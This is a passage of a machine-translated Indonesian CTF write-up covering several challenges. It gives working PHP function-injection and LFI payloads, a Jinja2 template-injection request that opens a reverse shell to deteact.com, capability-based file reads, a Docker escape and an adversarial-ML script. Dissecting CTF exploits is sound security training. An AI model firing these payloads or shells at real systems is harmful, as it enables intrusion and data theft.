<i>filter</i> '. </li><li>  Validasi unggahan gambar sekarang jelas bagi kami. </li><li>  Pustaka ImageMagic digunakan.  Dengan asumsi bahwa itu digunakan untuk mengeksploitasi adalah deadend.  Saya tidak berpikir ada cara untuk mengeksploitasinya tanpa mengandalkan FI. </li></ul><br><h4>  Kerentanan: Injeksi Fungsi </h4><br>  File <b>upload.php</b> memiliki beberapa kode yang mencurigakan: <br><br><pre> <code class="php hljs">$filterImage = $_POST[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>]($size, $text);</code> </pre> <br>  Kami dapat menyederhanakannya untuk: <br><br><pre> <code class="php hljs">$filterImage = $_GET[<span class="hljs-string"><span class="hljs-string">'filter'</span></span>](intval($_GET[<span class="hljs-string"><span class="hljs-string">'size'</span></span>]), $_GET[<span class="hljs-string"><span class="hljs-string">'text'</span></span>]);</code> </pre> <br>  Anda sebenarnya dapat mendeteksi kerentanan ini hanya dengan melakukan sedikit fuzzing.  Mengirim nama fungsi seperti " <b>var_dump</b> " atau " <b>debug_zval_dump</b> " di input ' <i>filter</i> ' akan menghasilkan respons menarik dari server. <br><br><pre> <code class="plaintext hljs">int(51) string(10) "jsdksjdksds"&lt;/code&gt; So, its not hard to guess how server side code looks like. If we had an write permission to www root, than we could just use two functions: &lt;code&gt;file_put_contents(0, "&lt;?php system($_GET[a]);") chmod(0, 777)</code> </pre> <br>  Tetapi ini bukan kasus kami.  Setidaknya ada dua cara untuk menyelesaikan tugas. <br><br><h4>  filter_input_array vektor (solusi yang tidak diinginkan): vektor RCE </h4><br>  Sambil memikirkan cara-cara yang mungkin untuk mendapatkan RCE, saya perhatikan bahwa <code>function filter_input_array</code> memberi kita kendali yang cukup baik atas <code>$filterImage variable</code> . <br><br>  Lulus <b>filter array</b> sebagai argumen kedua, akan memungkinkan untuk membangun array sewenang-wenang pada hasil fungsi. <br><br>  Tapi ImageMagic tidak berharap mendapatkan apa pun selain kelas Imagick.  :( <br><br>  Mungkin kita dapat membatalkan kelas dari input?  Mari kita cari argumen filter tambahan di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">deskripsi filter_input_array</a> . <br><br>  Itu tidak disebutkan di halaman fungsi itu sendiri, tetapi kita benar-benar dapat melewati <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">panggilan balik untuk validasi input</a> .  Contoh FILTER_CALLBACK adalah untuk <code>filter_input</code> , tetapi juga berfungsi untuk <code>filter_input_array</code> ! <br><br>  Ini berarti bahwa kami dapat "memvalidasi" input pengguna khusus menggunakan fungsi dengan satu argumen (eval? System?), Dan kami memiliki kendali atas argumen tersebut. <br><br><pre> <code class="plaintext hljs">FILTER_CALLBACK = 1024</code> </pre> <br>  Contoh untuk mendapatkan RCE: <br><br><pre> <code class="plaintext hljs">GET: a=/get_the_flag POST: filter=filter_input_array size=1 text[a][filter]=1024 text[a][options]=system submit=1</code> </pre> <br>  Tanggapan: <br><br><pre> <code class="plaintext hljs">*** Wooooohooo! *** Congratulations! Your flag is: 1m_t3h_R34L_binaeb_g1mme_my_71ck37 -- SPbCTF (vk.com/spbctf)</code> </pre> <br>  Baris yang <b>dicari</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br><br>  Pasti ada yang salah, karena mengapa kita perlu mendapatkan kode sumber?  Hanya untuk sebuah petunjuk?  Mengapa file yang diunggah disimpan dalam disk, bukankah lebih mudah untuk tidak menyimpan file sampah dari pengguna tantangan? <br><br>  Kebetulan dalam penamaan <b>filter</b> = <b>filter</b> _input_array, teks [a] [ <b>filter</b> ] memberi saya keyakinan bahwa semuanya dilakukan seperti yang diharapkan (" <b>filter yang</b> belum pernah dilihat", centang ‚úì). <br><br><h4>  vektor spl_autoload: vektor LFI </h4><br>  Setelah mengirimkan solusi saya dihubungi oleh salah satu penulis tantangan, yang mengatakan bahwa vektor saya tidak dimaksudkan dan fungsi lain dapat digunakan ( <code>spl_autoload</code> ): <br><br>  Tidak jelas bagaimana kita dapat menggunakan fungsi ini karena seperti yang seharusnya memuat kelas "&lt;class_name&gt;" dari file bernama "&lt;class_name&gt; &lt;some_extension&gt;".  Tanda tangan adalah sebagai berikut: <br><br><pre> <code class="php hljs">void spl_autoload ( string $class_name [, string $file_extensions = spl_autoload_extensions() ] )</code> </pre> <br>  Argumen pertama kami hanya bisa berupa angka (1-512), jadi <i>nama kelasnya</i> adalah ... nomor? ... aneh. <br>  Argumen <i>ekstensi</i> juga terlihat tidak dapat digunakan, file terkontrol satu tingkat lebih dalam dari <b>unggahan.php</b> (kita perlu memberikan awalan). <br><br>  Fungsi ini sebenarnya dapat memberi kita LFI jika digunakan dengan cara ini: <br><br><pre> <code class="plaintext hljs">spl_autoload(51, "a8ae2cab09c6b728919fe09af57ded/1.jpg") = include("51a8ae2cab09c6b728919fe09af57ded/1.jpg")</code> </pre> <br>  Nama direktori diperoleh dari kode sumber yang bocor.  Dan kami beruntung, karena jika karakter pertama dari nama selain angka -&gt; kami tidak dapat memasukkan file dari sana. <br><br>  Jadi ... yang kita butuhkan sekarang adalah meloloskan "kind-of-valid" ( <b>getimagesize</b> harus menerimanya) <b>* .jpg</b> file dengan kode php ditingkatkan.  Contoh sederhana (payload php dalam exif) terlampir. <br><br>  Unggah sebagai <i>1111.jpg</i> , dan lakukan: <br><br>  DAPATKAN: <br>  a = / get_the_flag <br><br>  POST: <br>  filter = spl_autoload <br>  ukuran = 51 <br>  text = a8ae2cab09c6b728919fe09af57ded / 1111.jpg <br>  kirim = 1 <br><br>  Tanggapan: <br> <code>... .JFIF ... Exif MM * . " (. . .i . . D . D .. V .. <br> *** Wooooohooo! *** <br> <br> Congratulations! Your flag is: <br> 1m_t3h_R34L_binaeb_g1mme_my_71ck37 <br> <br> -- SPbCTF (vk.com/spbctf)</code> <br>  Baris yang <b>dicari</b> : <b>1m_t3h_R34L_binaeb_g1mme_my_71ck37</b> <br>  Pengunggahan dan LFI dapat dilakukan dalam satu permintaan. <br><br><img src="https://habrastorage.org/webt/ya/ss/ns/yassnsu_przliwzh-nj1s0sm1gs.jpeg"><br><br><h2><a name="Time"></a>  Day5.  Waktu </h2><br>  Tugas ini disiapkan oleh <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tim Keamanan Digital</a> <br>  <i>Hal pertama yang Anda butuhkan adalah menaklukkan waktu, yang kedua adalah melampaui dunia kecil.</i>  <i>Setelah itu Anda akan mendapatkan senjata melawan bos tingkat akhir.</i>  <i>Semoga beruntung</i> <i><br><br></i>  <i>51.15.75.80</i> <i><br></i> <br>  <b>Petunjuk</b> <br>  <i><b>10/27/2018 16:00</b></i> <i><br></i>  <i>Oh, berapa banyak perangkat pada kotak ... apakah mereka benar-benar bermanfaat?</i> <i><br></i>  <i><b>10/27/2018 14:35</b></i> <i><br></i>  <i>Jika Anda dapat mengatasi filter pada timepanel, maka Anda dapat menggunakan kemampuan seluruh sistem.</i>  <i>Jangan malu-malu.</i> <i><br></i>  <i><b>10/27/2018 14:25</b></i> <i><br></i>  <i>Periksa host virtual dan jangan memikirkan 200</i> <i><br></i>  <i><b>10/26/2018 19:25</b></i> <i><br></i>  <i>Tugas tidak terpecahkan.</i>  <i>24 jam ditambahkan.</i> <i><br></i>  <i><b>10/26/2018 17:35</b></i> <i><br></i>  <i>Gunakan semua kemampuan Anda.</i> <i><br></i>  <i><b>10/26/2018 12:25</b></i> <i><br></i>  <i>Anda tidak memerlukan perangkat lunak forensik apa pun untuk menyelesaikan tahapan tugas apa pun.</i> <br><br><h4>  1) Wordpress </h4><br>  Awalnya, kami diberi alamat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">51.15.75.80</a> . <br>  Kami menjalankan hehdirb - kami melihat direktori / wordpress /.  Segera buka panel <i>admin di</i> bawah <i>admin: admin</i> . <br>  Di panel admin, kami melihat bahwa tidak ada hak istimewa untuk mengubah template, jadi Anda tidak bisa mendapatkan RCE saja.  Namun, ada pos tersembunyi: <br>  <i>09/25/2018 OLEH ADMINISTRATOR</i> <i><br></i>  <i>Pribadi: Catatan tentang panel waktu</i> <i><br></i>  <i>login: cristopher</i> <i><br></i>  <i>kata sandi: L2tAPJReLbNSn085lTvRNj</i> <i><br></i>  <i>host: timepanel.zn</i> <br><br><h4>  2) SSTI </h4><br>  Jelas, Anda harus pergi ke server yang sama dengan menentukan <b>timepanel.zn</b> host virtual <b>.</b> <br>  Kita mulai hehdirb pada host ini - kita melihat direktori / adm_auth, kita masuk di bawah login dan kata sandi yang diberikan di atas.  Kami melihat formulir di mana Anda harus memasukkan tanggal ("dari" dan "ke") untuk mendapatkan beberapa informasi.  Pada saat yang sama, kami melihat komentar di kode HTML respons tempat tanggal yang sama tercermin: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:00, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  Jelas, bug di sini kemungkinan besar harus terkait dengan refleksi ini, dan itu tidak mungkin XSS, jadi coba SSTI: <br><br><pre> <code class="plaintext hljs">start=2018-10-25+20%3A00%3A00{{ 1 * 0 }}&amp;finish=2018-10-26+20%3A00%3A00</code> </pre> <br>  Jawabannya adalah: <br><br><pre> <code class="plaintext hljs">&lt;!- start time: 2018-10-25 20:00:000, finish time:2018-10-26 20:00:00 -&gt;</code> </pre> <br>  Dengan mengirimkan {{self}}, {{'a' * 5}}, kami menyadari bahwa ini adalah <b>Jinja2</b> , tetapi vektor standar tidak berfungsi.  Mengirim vektor tanpa {{tanda kurung}}, kita melihat bahwa jawabannya tidak mencerminkan karakter "_" dan beberapa kata, misalnya, "kelas".  Filter ini dapat dengan mudah dilewati menggunakan request.args dan konstruk | attr (), serta menyandikan beberapa byte dengan urutan escape. <br><br><div class="spoiler">  <b class="spoiler_title">Permintaan terakhir untuk koneksi kembali</b> <div class="spoiler_text"> <code>POST /adm_main?sc=from+subprocess+import+check_output%0aRUNCMD+%3d+check_output&amp;cmd=bash+-c+'bash+-i+&gt;/dev/tcp/deteact.com/8000+&lt;%261' HTTP/1.1 <br> Host: timepanel.zn <br> Content-Type: application/x-www-form-urlencoded <br> Content-Length: 616 <br> Cookie: session=eyJsb2dnZWRfaW4iOnRydWV9.DrOOLQ.ROX16sOUD_7v5Ct-dV5lywHj0YM <br> <br> start={{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg','w')|attr('write')(request.args.sc) }} <br> {{ ''|attr('\x5f\x5fcl\x61ss\x5f\x5f')|attr('\x5f\x5f\x6dro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(2)|attr('\x5f\x5fsubcl\x61sses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(40)('/var/tmp/BECHED.cfg')|attr('read')() }} <br> {{ config|attr('from\x5fpyfile')('/var/tmp/BECHED.cfg') }} <br> {{ config['RUNCMD'](request.args.cmd,shell=True) }} <br> &amp;finish=2018-10-26+20%3A00%3A00</code> <br> </div></div><br><h4>  3) LPE </h4><br>  Setelah menerima RCE, kami memahami bahwa Anda perlu meningkatkan hak akses ke root.  Ada beberapa jalur yang salah (/ usr / bin / special, /opt/privesc.py dan beberapa lainnya) yang tidak ingin saya uraikan, karena hanya membutuhkan waktu.  Ada juga binar / usr / bin / nol, yang tidak memiliki bit-suid, tetapi ternyata ia dapat membaca file apa pun (cukup kirimkan jalur hex-encoded di stdin). <br><br>  Alasannya adalah kemampuan (/ usr / bin / zero = cap_dac_read_search + ep). <br>  Kami membaca bayangan, mengatur hash yang akan disikat, tetapi sementara itu disikat, kami menduga bahwa kami perlu membaca file pengguna lain yang ada di sistem: <br><br> <code>$ echo /home/cristopher/.bash_history | xxd -p | zero</code> <br> <br>  <i>Saya dapat membaca sesuatu untuk Anda</i> <i><br></i>  <i>su</i> <i><br></i>  <i>Dpyax4TkuEVVsgQNz6GUQX</i> <br><br><h4>  4) Docker escape / Forensics </h4><br>  Jadi, kami memiliki root.  Tapi ini bukan akhirnya.  Kami <i>memasang apt install extundelete</i> dan menemukan beberapa file lebih menarik di sistem file yang terkait dengan tahap selanjutnya: <br><br>  <i>Untuk mendapatkan tiket, Anda perlu mengubah gambar sehingga diidentifikasi sebagai "1".</i>  <i>Anda memiliki model dan gambar.</i>  <i>curl -X POST -F image=@ZeroSource.bmp 'http://51.15.100.188 {6491 / prediksi'.</i> <br><br>  Jadi, sekarang kita dihadapkan dengan tugas standar menghasilkan contoh kompetitif untuk model pembelajaran mesin.  Namun, pada tahap ini saya masih belum bisa mendapatkan semua file yang saya butuhkan.  Itu mungkin untuk melakukan ini hanya dengan menempatkan agen R-Studio di server dan mengambil forensik jarak jauh.  Setelah hampir mengeluarkan apa yang saya butuhkan, saya menemukan bahwa, pada kenyataannya, wadah buruh pelabuhan berjalan dalam mode yang memungkinkan Anda untuk memasang seluruh disk <br><br>  Kami membuat mount / dev / vda1 / root / kek dan mendapatkan akses ke sistem file host, dan pada saat yang sama akses root ke seluruh server (karena kita dapat meletakkan kunci ssh kita sendiri).  Kami mengeluarkan KerasModel.h5, ZeroSource.bmp. <br><br><h4>  5) ML permusuhan </h4><br>  Segera jelas dari gambar bahwa jaringan saraf dilatih pada dataset MNIST.  Ketika kami mencoba mengirim gambar sewenang-wenang ke server, kami mendapat jawaban bahwa gambarnya terlalu banyak berbeda.  Ini berarti bahwa server mengukur jarak antara vektor, karena ia menginginkan contoh permusuhan, dan bukan hanya gambar dengan gambar ‚Äú1‚Äù. <br><br>  Kami mencoba serangan pertama yang kami dapatkan dari foolbox - kami mendapatkan vektor serangan, tetapi server tidak menerimanya (jaraknya terlalu jauh).  Lalu saya pergi ke alam liar, mulai membuat kembali implementasi One Pixel Attack di bawah MNIST, dan tidak ada yang datang darinya, karena serangan ini menggunakan algoritma evolusi diferensial, itu bukan gradien dan mencoba untuk menemukan minimum stokastik, dipandu oleh perubahan dalam vektor probabilitas.  Tetapi vektor probabilitas tidak berubah, karena jaringan saraf terlalu percaya diri. <br><br>  Pada akhirnya, saya harus ingat tentang petunjuk yang ada di file teks asli di server - "(Normilize ^ _ ^)".  Setelah normalisasi dengan hati-hati, adalah mungkin untuk melakukan serangan secara efektif menggunakan algoritma optimasi L-BFGS, di bawah ini adalah exploit terakhir: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> foolbox <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> keras <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> numpy <span class="hljs-keyword"><span class="hljs-keyword">as</span></span> np <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.attacks <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> LBFGSAttack <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> foolbox.criteria <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> TargetClassProbability <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> keras.models <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> load_model <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> PIL <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> Image image = Image.open(<span class="hljs-string"><span class="hljs-string">'./ZeroSource.bmp'</span></span>) image = np.asarray(image, dtype=np.float32) / <span class="hljs-number"><span class="hljs-number">255</span></span> image = np.resize(image, (<span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) kmodel = load_model(<span class="hljs-string"><span class="hljs-string">'KerasModel.h5'</span></span>) fmodel = foolbox.models.KerasModel(kmodel, bounds=(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = image[:, :] <span class="hljs-keyword"><span class="hljs-keyword">try</span></span>: attack = LBFGSAttack(model=fmodel, criterion=TargetClassProbability(<span class="hljs-number"><span class="hljs-number">1</span></span>, p=<span class="hljs-number"><span class="hljs-number">.5</span></span>)) adversarial = attack(image[:, :], label=<span class="hljs-number"><span class="hljs-number">0</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">except</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> <span class="hljs-string"><span class="hljs-string">'FAIL'</span></span> quit() <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> kmodel.predict_proba(adversarial.reshape(<span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">28</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)) adversarial = np.array(adversarial * <span class="hljs-number"><span class="hljs-number">255</span></span>, dtype=<span class="hljs-string"><span class="hljs-string">'uint8'</span></span>) im = Image.open(<span class="hljs-string"><span class="hljs-string">'ZeroSource.bmp'</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> x <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> y <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> xrange(<span class="hljs-number"><span class="hljs-number">28</span></span>): im.putpixel((y, x), int(adversarial[x][y][<span class="hljs-number"><span class="hljs-number">0</span></span>])) im.save(<span class="hljs-string"><span class="hljs-string">'ZeroSourcead1.bmp'</span></span>) os.system(<span class="hljs-string"><span class="hljs-string">"curl -X POST -F image=@ZeroSourcead1.bmp 'http://51.15.100.188:36491/predict'"</span></span>)</code> </pre> <br>  Baris yang <b>dicari</b> : <b>H3y_Y0u'v_g01_4_n1c3_t1cket</b> <br><br><img src="https://habrastorage.org/webt/z0/tj/mx/z0tjmxh38kcphl5dxja6n9scepc.jpeg"><br><br><h2><a name="Awesome_Vm"></a>  Hari6.  Vm yang luar biasa </h2><br>  Tugas ini disiapkan oleh tim <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">KKP Sekolah</a> . <br>  <i>Lihatlah layanan pelatihan baru!</i>  <i>zn.sibears.ru:8000</i> <i><br><br></i>  <i>Saat ini kami ingin melibatkan Anda dalam pengujian beta mesin virtual baru yang dibuat khusus untuk menguji kemampuan pemrograman pemula kami.</i>  <i>Kami telah menambahkan perlindungan intelektual terhadap kecurangan dan sekarang ingin memeriksa semuanya sebelum menawarkan platfotm.</i>  <i>VM memungkinkan Anda untuk menjalankan program sederhana ... atau tidak hanya ?!</i> <i><br><br></i>  <i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">goo.gl/iKRTrH</a></i> <br><br>  <b>Petunjuk</b> <br>  <i><b>10/27/2018 16:20</b></i> <i><br></i>  <i>Mungkin Anda bisa menipu atau mem-bypass sistem AI?</i> <br><br><h4>  Deskripsi: </h4><br><img src="https://habrastorage.org/webt/8k/p1/xy/8kp1xynj1xl3s7xtbs4_jznf0k4.png"><br><br>  Layanan ini adalah sistem validasi untuk file dengan ekstensi .cmpld yang diterima oleh penerjemah sibVM.  Tugas yang harus diselesaikan oleh program yang dikirim: menghitung jumlah angka yang tercantum dalam file input.txt, agak mengingatkan kita pada kompetisi ACM.  Juga, deskripsi antarmuka web menunjukkan bahwa program yang dikirim akan diperiksa menggunakan kecerdasan buatan. <br><br>  Layanan ini terdiri dari dua wadah Docker: <b>web-docker</b> dan <b>prod_inter</b> . <br><br>  <b>web-docker</b> tidak terlalu menarik untuk dianalisis.  Semua yang dia lakukan adalah menerjemahkan file yang dikirim ke wadah prod_inter, di dalamnya semua hal yang paling menarik terjadi.  Cuplikan kode yang sesuai disajikan di bawah ini: <br><img src="https://habrastorage.org/webt/ca/xv/em/caxvem0icoy4awon-funprflkps.jpeg"><br><br>  Dalam wadah <b>prod_inter</b> , file yang dikirim diperiksa dan dieksekusi pada data uji.  Untuk setiap pengiriman, direktori baru dibuat dalam / tmp / secara acak, di mana file yang dikirim disimpan dengan nama acak.  File flag.txt juga ditempatkan di direktori yang dibuat, yang mungkin merupakan tujuan kami. <br><br>  Kemudian bagian yang menyenangkan dimulai: jika file lebih besar dari 8192 byte, maka file input program diperiksa menggunakan kecerdasan buatan.  AI adalah jaringan saraf ultraprecise pra-terlatih.  Jika tes berhasil (data input lebih dari 8192 byte, dan jaringan saraf yang menetapkan mereka untuk kelas pertama), program berjalan pada lima tes yang berbeda, dan hasilnya dikirim dalam pesan respon dan ditampilkan kepada pengguna. <br><br>  Jika ukuran data input kurang dari 8192 byte, atau mereka tidak lulus tes oleh jaringan saraf, maka sebelum pengujian ada pemeriksaan tambahan program untuk keberadaan substring flag.txt di dalamnya dan untuk upaya membuka file dengan nama itu.  Akses ke file flag.txt dipantau dengan menjalankan program di kotak pasir <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">secfilter</a> , berdasarkan pada teknologi <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">SECCOMP</a> , dan menganalisis log eksekusi.  Di bawah ini adalah kode layanan yang sesuai dan contoh log ketika mencoba membuka file terlarang: <br><br><img src="https://habrastorage.org/webt/vq/6-/-h/vq6--he6uvlc2zh6mvkmaqjow6q.jpeg"><br><br><img src="https://habrastorage.org/webt/lj/wg/vn/ljwgvn5gexwp23syezju5uexfjc.jpeg"><br><br>  Untuk menyelesaikan tugas ini, saya membuat satu set program untuk interpreter sibVM yang membuka file flag.txt dan menampilkan nilai numerik byte ke-1 file tersebut.  Setiap program pada saat yang sama berhasil melewati tes AI.  Berikutnya adalah analisis permukaan jaringan saraf dan deskripsi mesin virtual. <br><br><h4>  Analisis jaringan saraf </h4><br>  Model jaringan saraf yang terlatih terkandung dalam file cnn_model.h5.  Berikut ini adalah informasi umum tentang arsitektur jaringan. <br><br><img src="https://habrastorage.org/webt/lj/7a/jj/lj7ajjrgzgml68gsmqsukdrn7wa.jpeg"><br><br>  Kami tidak tahu persis apa yang dikenali jaringan saraf, jadi kami akan mencoba memberi makan berbagai data.  Dari arsitektur jaringan jelas bahwa pada input menerima gambar saluran tunggal ukuran 100X100.  Untuk menghindari efek penskalaan pada hasil, kami akan menggunakan urutan 10.000 byte yang dikonversi menjadi gambar menggunakan fungsi yang digunakan dalam layanan.  Di bawah ini adalah hasil pengoperasian jaringan saraf pada berbagai data: <br><br><img src="https://habrastorage.org/webt/s0/vd/tn/s0vdtnbuqcbnqxd1ho_5wzlyyps.jpeg"><br><br>  Berdasarkan hasil, dapat diasumsikan bahwa jaringan saraf akan menerima gambar dengan dominasi warna hitam (nol byte).  Kemungkinan besar, menulis sebuah program yang membaca karakter bendera akan membutuhkan kurang dari 1000 byte signifikan (sisanya dapat diisi dengan nol), dan kemudian AI akan menerima program yang dikirim. <br><br>  Dengan demikian, untuk menyelesaikan tugas, tetap menulis program yang diinginkan. <br><br><h4>  Penerjemah SibVM </h4><br>  <b>Struktur program</b> <br>  Langkah pertama adalah memahami struktur file program.  Selama kebalikan dari penerjemah, ternyata program harus dimulai dengan header tertentu dengan beberapa bidang layanan, diikuti oleh seperangkat entitas dengan pengidentifikasi, di antaranya harus ada entitas utama dari tipe Function. <br><br><div class="spoiler">  <b class="spoiler_title">Pemeriksaan Header File</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/2d/th/mb/2dthmbi3qyu4czj9qkc9zv8asam.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Mengambil Catatan</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ab/vm/jb/abvmjbhfwcbxnu_nqxyue6pnlua.png"><br></div></div><br><div class="spoiler">  <b class="spoiler_title">Memproses catatan dan meluncurkan fungsi utama</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/eh/ki/qc/ehkiqcracavi3y75_bkj5kvcany.png"><br></div></div><br>  Hasilnya adalah format file input berikut: <br><br><img src="https://habrastorage.org/webt/ka/bs/py/kabspyig7f_jv7ysl_maco90itc.png"><br><br><h4>  Tipe data </h4><br>  Penerjemah mendukung berbagai jenis entitas.  Di bawah ini adalah tabel dan pengidentifikasi mereka, yang di masa depan akan diperlukan untuk membangun program. <br><br><img src="https://habrastorage.org/webt/jf/fd/wc/jffdwc5yc6beasqr57sr3goy6ks.jpeg"><br><br><h4>  Membangun program untuk penerjemah </h4><br>  Seperti disebutkan di atas, program harus memiliki entri utama dengan tipe Function (5).  Ini memiliki format berikut: <br><br><img src="https://habrastorage.org/webt/bn/hw/g3/bnhwg3b5nh2egxv9dhi1aloarx8.png"><br><br>  Tidak sulit untuk mengetahui siklus pelaksanaan program utama. <br><br><div class="spoiler">  <b class="spoiler_title">Siklus eksekusi utama</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/dl/ny/0r/dlny0rj2neh87uf72nljadx5bp0.png"><br></div></div><br>  Fungsi <code>decode_opcode</code> mengambil informasi tentang operasi selanjutnya dari kode program.  Dua byte pertama dari setiap operasi berisi kode operasi, jumlah argumen dan tipenya.  Beberapa byte berikutnya (tergantung pada jenis dan jumlah argumen) akan ditafsirkan sebagai argumen untuk operasi. <br><br>  Format dua byte pertama operasi: <br><br><img src="https://habrastorage.org/webt/gn/70/av/gn70avw2rknailevx2byn4ezspw.png"><br><br>  Selanjutnya, kami akan meninjau beberapa instruksi yang akan membantu kami mengekstrak bendera dari sistem. <br><br><div class="spoiler">  <b class="spoiler_title">Command interpreter graph, execute_opcode function</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/ht/zm/pr/htzmprbyxebqmna2jg56vbi-jf4.png"><br></div></div><br><ul><li>  Opcode 0 - membuka file (nama file ditentukan oleh argumen operasi dan bertipe String) dan menempatkan kontennya di atas tumpukan sebagai objek bertipe <code>ByteArray</code> . </li><li>  Opcode 2 - Menampilkan nilai yang disimpan di bagian atas tumpukan.  Sayangnya, operasi ini tidak akan menampilkan nilai objek bertipe <code>ByteArray</code> .  Untuk mengatasi masalah ini, Anda bisa mendapatkan elemen ke-l dari array dan menampilkannya. </li></ul><br><div class="spoiler">  <b class="spoiler_title">Memproses opcode 2</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/or/vt/0p/orvt0pk4mokjuxbgw-yqjxpac8u.png"><br></div></div><br><ul><li>  Opcode 13 - mengambil elemen dari array dengan indeks.  Array dan indeks elemen muncul dari stack, hasilnya didorong ke stack.  Dengan demikian, untuk mengkompilasi program kerja, perlu untuk meletakkan indeks di stack. </li><li>  Opcode 7 - mendorong argumen operasi ke stack. </li></ul><br>  Akibatnya, program ini hanya terdiri dari 4 operasi: <br><br><img src="https://habrastorage.org/webt/tx/t4/ga/txt4gaep-ibcfsdx0wco7gg_heg.jpeg"><br><br><img src="https://habrastorage.org/webt/ja/mv/nt/jamvnt3jnzj6xlj8pfn_vnd0dbc.png"><br><div class="spoiler">  <b class="spoiler_title">Program akhir</b> <div class="spoiler_text"><img src="https://habrastorage.org/webt/m1/6y/yn/m16yynqvryb1clqwwf6hsgv0mxs.jpeg"><br></div></div><br>  Baris yang <b>dicari</b> : <b>flag {76f98c7f11582d73303a4122fd04e48cba5498}</b> <br><br><img src="https://habrastorage.org/webt/yb/bw/am/ybbwamafhoijkcn2g871s_73wb8.jpeg"><br><br><h2><a name="Hiddenresource"></a>  Hari ke 7.  Sumberdaya tersembunyi </h2><br>  Tugas ini disiapkan oleh <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">RuCTF</a> . <br><br>  <i>Diberikan layanan <a href="">n24.elf</a> .</i>  <i>Cukup otorisasi pada 95.216.185.52 dan beri Anda flag.</i> <br><br>  <b>Petunjuk</b> <b><br></b>  <b><i>10/28/2018 20:00</i></b> <br>  <i>Tugas tidak terpecahkan.</i>  <i>24 jam ditambahkan.</i> <br><br>  Survei server untuk akses menggunakan protokol koneksi standar menunjukkan akses melalui SSH (port 22).  File yang disediakan adalah executable ELF (yang secara halus disiratkan oleh ekstensi dalam nama) untuk Linux. <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#file UwRJ8iaEEd4tSQIe_n24.elf UwRJ8iaEEd4tSQIe_n24.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, stripped</span></span></code> </pre><br>  Menggunakan utilitas string menunjukkan keberadaan baris ‚Äú/ home / lab /.ssh‚Äù dan ‚Äú/ rumah / lab /.ssh/authorized_keys‚Äù.  Kesimpulan tentang kemungkinan akses ke file kunci otorisasi kata sandi SSH dari file yang dapat dieksekusi ELF (selanjutnya disebut sebagai layanan). <br><br>  Tabel simbol berisi fungsi yang diperlukan untuk membuka file dan menulis: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># readelf --dyn-syms UwRJ8iaEEd4tSQIe_n24.elf | grep fopen 23: 